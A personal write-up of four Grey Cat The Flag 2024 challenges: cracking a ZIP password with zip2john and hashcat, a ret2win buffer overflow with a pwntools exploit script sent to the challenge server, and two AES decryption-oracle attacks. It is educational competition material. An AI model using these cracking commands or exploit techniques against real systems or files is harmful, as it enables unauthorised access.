Grey Cat The Flag 2024 was a 24-hour long CTF from 20th April 12pm SGT to 21st April 12pm SGT. It featured many challenges across categories such as rev, pwn, crypto, misc, blockchain and web. My team G04T3DP30PL3 placed 45th out of 407 teams globally, and 23rd out of 156 teams locally. We had a total of 14 solves, of which 10 were misc, 1 was crypto, 2 were web and 1 was pwn.

I helped to solve 1 misc challenge, 1 pwn challenge and 1 crypto challenge, and (unfortunately) solved another crypto one right as the CTF ended. This writeup details my approach to these 4 challenges.

# Misc

## Cashhat The Ripper

<img src = "/assets/greyctf24/CashHat_chall.png" alt="Cash Hat Challenge" style="width: 400px; height: 300px">

In this challenge we are given a password-protected ZIP file which can be downloaded [here](/assets/greyctf24/dist-CashHat-The-Ripper.zip). As the name suggests, we likely need to use `hashcat` and `John The Ripper` to bruteforce its weak password.

First we use `John` to make a hash of the file using `zip2john chall.zip > chall.hash`. We then remove the filenames from the start and end of the hash, leaving us with the hash:

<img src = "/assets/greyctf24/CashHat_hash.png" alt="Screenshot of hashed ZIP file" style="width: 500px; height: 70px">

Then, using `hashcat`, we perform a dictionary attack, specifying that it is a PKZIP file. We perform this attack using the rockyou dictionary: `hashcat -m 17200 -a 0 chall.hash /usr/share/wordlists/rockyou.txt`.

`hashcat` cracks the password quite quickly, and tells us that the password is `123mango`.

<img src = "/assets/greyctf24/hashcat_output.png" alt="Screenshot of hashcat output" style="width: 400px; height: 300px">

Using this to unlock the ZIP file, we obtain the flag: `flag{W34k_P4ssw0rds_St4Nd_n0_Ch4nc3}`

# Pwn

## Baby Goods

<img src = "/assets/greyctf24/baby_goods_ss.png" alt="Baby Goods Challenge" style="width: 400px; height: 300px">

We are given [files](/assets/greyctf24/dist-baby-goods.zip) containing a binary file and a C file. On running `checksec babygoods` we can see the protections:

<img src = "/assets/greyctf24/baby_goods_protections.png" alt="Baby Goods Binary Protections" style="width: 300px; height: 100px">

Note that there is no canary and no PIE, therefore all addresses of code are static. There is a global variable, `char name[0x20]`. Let's go through the functions sequentially:

```c
int main() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);

    printf("Enter your name: ");
    fgets(username,0x20,stdin);
    username[strcspn(username, "\r\n")] = '\0';
    menu(username);
    return 0;
}
```

The main function essentially copies the username of the user and displays a menu using it.

```c
int menu(char name[0x20]) {
    char input[4];
    do {
        printf("\nHello %s!\n", name);
        printf("Welcome to babygoods, where we provide the best custom baby goods!\nWhat would you like to do today?\n");
        printf("1: Build new pram\n");
        printf("2: Exit\n");
        printf("Input: ");
        fgets(input, 4, stdin);
        input[strcspn(input, "\r\n")] = '\0';
        switch (atoi(input))
        {
        case 1:
            buildpram();
            break;
        default:
            printf("\nInvalid input!\n==========\n");
            menu(name);
        }
    } while (atoi(input) != 2);
    exitshop();
}
```

The `menu` function allows us to choose from either building a pram or exiting the program.

```c
int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}
```

In `buildpram`, the user is prompted to choose a pram size, which is copied into `char size[4]`. The vulnerability is when a name is given to the pram. Using the `gets` function allows us to overflow the buffer and write into memory outside of `buf`.

There is another interesting function:

```c
int sub_15210123() {
    execve("/bin/sh", 0, 0);
}
```

We can see that this function gives us shell access from the program, so we need to enter this function to read the flag.

This is a typical stack overflow ret2win challenge, and we can simply overflow the buffer and overwrite `RIP` to the address of `sub_15210123` to get the shell.

Let's find the address of `sub_15210123` first:

```

```

So now we know that `sub_15210123` is located at `0x00401236`.

I then used De Brujin sequences to find the offset of `RIP` from the address of our input.

First we generate the sequence using `Python`,

```python
elijah@soyabean: $ python3
[truncated]
> from pwn import *
cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>
```

Then we use the following script to run the program and allow us to attach `pwndbg` to it:

```python
from pwn import *

p = process('./babygoods')

pause()
p.interactive()
```

When the program is started we attach with gdb by using `gdb -p <port number>`. Then we enter our payload into the program as follows:

<img src = "/assets/greyctf24/babygoods_payload_1.png" alt="Baby Goods Payload Insertion" style="width: 500px; height: 300px">

Correspondingly, in `pwndbg` we receive a segmentation fault as expected and find the portion of the De Brujin sequence `RIP` was overwritten to:

<img src = "/assets/greyctf24/babygoods_pwndbg.png" alt="Baby Goods pwndbg screenshot" style="width: 700px; height: 500px">

Note that it was to obtain the portion of the sequence with `b'kaaalaaa'`. So now we use `pwn` in Python to find the offset of `RIP`:

```python
>>> cyclic_find(b'kaaalaaa')
[!] cyclic_find() expected a 4-byte subsequence, you gave b'kaaalaaa'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
40
```

Now that we know the offset of `RIP` is 40 and `sub_15210123` is located at `0x00401236`, we can craft an exploit script:

```python
from pwn import *
# establish remote connection
conn = remote('challs.nusgreyhats.org',32345)
conn.recvuntil(b'name: ')
conn.sendline(b'hi')
conn.recvuntil(b'Input: ')
conn.sendline(b'1')
conn.recvuntil(b'(1-5): ')
conn.sendline(b'1')
# send payload
payload = 40 * b'a' + p64(0x00401236)
conn.sendline(payload)
# Interact with the shell
conn.interactive()
```

Now we execute the script to obtain the flag.

# Crypto

## Filtered Ciphertext

<img src = "/assets/greyctf24/filtered_ciphertext_chall.png" alt="Filtered Ciphertext Challenge" style="width: 300px; height: 300px">

We are given the following Python code:

```python
from Crypto.Cipher import AES
import os

with open("flag.txt", "r") as f:
    flag = f.read()

BLOCK_SIZE = 16
iv = os.urandom(BLOCK_SIZE)

xor = lambda x, y: bytes(a^b for a,b in zip(x,y))

key = os.urandom(16)

def encrypt(pt):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [pt[i:i+BLOCK_SIZE] for i in range(0, len(pt), BLOCK_SIZE)]
    tmp = iv
    ret = b""

    for block in blocks:
        res = cipher.encrypt(xor(block, tmp))
        ret += res
        tmp = xor(block, res)

    return ret


def decrypt(ct):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]

    for block in blocks:
        if block in secret_enc:
            blocks.remove(block)

    tmp = iv
    ret = b""

    for block in blocks:
        res = xor(cipher.decrypt(block), tmp)
        ret += res
        tmp = xor(block, res)

    return ret

secret = os.urandom(80)
secret_enc = encrypt(secret)

print(f"Encrypted secret: {secret_enc.hex()}")

print("Enter messages to decrypt (in hex): ")

while True:
    res = input("> ")

    try:
        enc = bytes.fromhex(res)

        if (enc == secret_enc):
            print("Nice try.")
            continue

        dec = decrypt(enc)
        if (dec == secret):
            print(f"Wow! Here's the flag: {flag}")
            break

        else:
            print(dec.hex())

    except Exception as e:
        print(e)
        continue
```

Let's break the functions down. First we look at the `encrypt` function:

```python
def encrypt(pt):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [pt[i:i+BLOCK_SIZE] for i in range(0, len(pt), BLOCK_SIZE)]
    tmp = iv
    ret = b""

    for block in blocks:
        res = cipher.encrypt(xor(block, tmp))
        ret += res
        tmp = xor(block, res)

    return ret
```

It basically splits the plaintext into blocks of 16 bytes, then iterates through each block. Each block is first `xor`'d with `tmp`, then the ciphertext is added to `ret`. `tmp` is then updated to be `xor(block, res)`, which is the XOR of the plaintext block and ciphertext block. We then return `ret` at the end of the function. Note that the `tmp` for every block is different. Now let's look at the `decrypt` function:

```python
def decrypt(ct):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]

    for block in blocks:
        if block in secret_enc:
            blocks.remove(block)

    tmp = iv
    ret = b""

    for block in blocks:
        res = xor(cipher.decrypt(block), tmp)
        ret += res
        tmp = xor(block, res)

    return ret
```

The decryption algorithm takes in a ciphertext and splits it into blocks. It then iterates through each block, and if it is present in the encrypted secret, the block is removed from the list. Once these blocks have been removed, we then iterate through the blocks and decrypt them. Each block is first decrypted using AES, then `xor`'d with `tmp` to get the plaintext block. Then we append the plaintext block to `ret`, and update `tmp` to be `xor(block, res)`.

The vulnerability in the code is the removal procedure. Namely, we are removing elements from the list as we are iterating through it. This has the following result on a list of size 10:

```python
lst = [1,2,3,4,5,1,2,3,4,5]
for i in lst:
    if i <= 16:
        lst.remove(i)
print(lst)
# [1,2,3,4,5]
```

Essentially our list is split exactly into half.

Since our ciphertext is 80 bytes (5 blocks) long, we can use this to 'trick' the program into decrypting the ciphertext for us. Once we are sent the ciphertext in hex by the server, we can just send the program back the ciphertext repeated once to obtain the plaintext. This gets us the flag:

## Filtered Plaintext

This was the challenge which I only solved right as the CTF ended... :(

<img src = "/assets/greyctf24/filtered_plaintext_chall.png" alt="Filtered Plaintext Challenge" style="width: 300px; height: 300px">

We are again given a Python script:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import md5
import os

with open("flag.txt", "r") as f:
    flag = f.read()

BLOCK_SIZE = 16
iv = os.urandom(BLOCK_SIZE)

xor = lambda x, y: bytes(a^b for a,b in zip(x,y))

key = os.urandom(16)

def encrypt(pt):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [pt[i:i+BLOCK_SIZE] for i in range(0, len(pt), BLOCK_SIZE)]
    tmp = iv
    ret = b""

    for block in blocks:
        res = cipher.encrypt(xor(block, tmp))
        ret += res
        tmp = xor(block, res)

    return ret


def decrypt(ct):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]


    tmp = iv
    ret = b""

    for block in blocks:
        res = xor(cipher.decrypt(block), tmp)
        if (res not in secret):
            ret += res
        tmp = xor(block, res)

    return ret

secret = os.urandom(80)
secret_enc = encrypt(secret)

print(f"Encrypted secret: {secret_enc.hex()}")

secret_key = md5(secret).digest()
secret_iv = os.urandom(BLOCK_SIZE)
cipher = AES.new(key = secret_key, iv = secret_iv, mode = AES.MODE_CBC)
flag_enc = cipher.encrypt(pad(flag.encode(), BLOCK_SIZE))

print(f"iv: {secret_iv.hex()}")

print(f"ct: {flag_enc.hex()}")

print("Enter messages to decrypt (in hex): ")

while True:
    res = input("> ")

    try:
        enc = bytes.fromhex(res)
        dec = decrypt(enc)
        print(dec.hex())

    except Exception as e:
        print(e)
        continue

```

Basically what the program is doing is first generating a 16 byte `key`, `iv` and `secret_iv`, an 80 byte `secret`, then calling `encrypt` on `secret` to encrypt using their algorithm (which uses `key` and `iv`). The ciphertext produced is `secret_enc`. Using `secret_key = md5(secret).digest()` as our key and `secret_iv` as our IV, we then perform AES CBC mode encryption (using `secret_key` and `secret_iv`) to encrypt the padded flag. The server gives us the values of `secret_enc`, `secret_iv` and `flag_enc`. Our goal is to basically decrypt the AES CBC mode encryption to find the plaintext flag. Since we already know `secret_iv`, to perform the decryption we need to find `secret_key`, which requires finding `secret`. This requires us to find a way to decrypt `secret_enc` which was encrypted using their algorithm. We are given a decryption oracle to aid us.

Now let's take a look at the `encrypt` function:

```python
def encrypt(pt):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [pt[i:i+BLOCK_SIZE] for i in range(0, len(pt), BLOCK_SIZE)]
    tmp = iv
    ret = b""

    for block in blocks:
        res = cipher.encrypt(xor(block, tmp))
        ret += res
        tmp = xor(block, res)

    return ret
```

It is essentially the same as the previous challenge. Now on to the `decrypt` function:

```python
def decrypt(ct):
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    blocks = [ct[i:i+BLOCK_SIZE] for i in range(0, len(ct), BLOCK_SIZE)]


    tmp = iv
    ret = b""

    for block in blocks:
        res = xor(cipher.decrypt(block), tmp)
        if (res not in secret):
            ret += res
        tmp = xor(block, res)

    return ret
```

Notice that even if we input a `block` which, when decrypted is present in `secret`, `tmp` will still be updated using the block and its decrypted value.

Now we can try thinking of possible inputs to the decryption oracle and their output values. Here I will use the following notation:

- $$p_x$$ denotes the x-th block of plaintext (starting from 1)
- $$c_x$$ denotes the x-th block of ciphertext (starting from 1)
- $$\oplus$$ denotes the XOR operation
- $$E()$$ denotes the AES ECB encryption using `key`
- $$D()$$ denotes the AES ECB decryption using `key`
- $$IV$$ refers to the iv used for encryption of `secret`.
- $$0..0$$ denotes a block of zeroes
- $$+$$ denotes a concatenation of byte blocks

Observe the following:

$$
Input: 0..0 \;\;\; Output: a = D(0..0)\oplus IV\\

Input: c_1+0..0 \;\;\; Output:b=D(0..0)\oplus c_1\oplus p_1 = D(0..0)\oplus c_1\oplus D(c_1)\oplus IV\\

Input: c_1+c_2+0..0 \;\;\; Output:c=D(0..0)\oplus c_2\oplus p_2 = D(0..0)\oplus c_2\oplus D(c_2)\oplus c_1\oplus p_1
$$

If we then did $$ a \oplus b $$ we would get $$ c_1 \oplus D(c_1) $$ , and if we did $$ b \oplus c $$ we would get $$ c_2 \oplus D(c_2) $$. In general this holds true.

Further note that

$$ Input:c_2\;\;\; Output:D(c_2)\oplus IV $$

From this we have

$$
b\oplus c\oplus (D(c_2)\oplus IV) = (c_2 \oplus D(c_2))\oplus (D(c_2)\oplus IV) = c_2\oplus IV
$$

Hence we have found a way to obtain the value of $$ IV $$ using only the ciphertext and the decryption oracle. With IV, we can solve for the plaintext as follows:

$$
a\oplus b=c_1\oplus D(c_1)\\
b\oplus c=c_2\oplus D(c_2)\\
c\oplus d=c_3\oplus D(c_3)\\
d\oplus e=c_4\oplus D(c_4)\\
e\oplus f=c_5\oplus D(c_5)\\
p_1=D(c_1)\oplus IV = (((a \oplus b) \oplus c_1) \oplus IV)\\
p_2 = D(c_2) \oplus (c_1 \oplus p_1) = ((b \oplus c) \oplus c_2)\oplus (c_1 \oplus p_1)\\
p_3 = D(c_3) \oplus (c_2 \oplus p_2) = ((c \oplus d) \oplus c_3)\oplus (c_2 \oplus p_2)\\
p_4 = D(c_4) \oplus (c_3 \oplus p_3) = ((d \oplus e) \oplus c_4)\oplus (c_3 \oplus p_3)\\
p_5 = D(c_5) \oplus (c_4 \oplus p_4) = ((e \oplus f) \oplus c_5)\oplus (c_4 \oplus p_4)\\
$$

# Final Thoughts

This CTF was demoralising as I did not solve as many rev, pwn and crypto challenges as I had hoped to, and most of the challenges involved concepts I wasn't familiar with. Nonetheless, I did learn from this CTF and I look forward to learning more and hopefully performing better in these categories in the future!
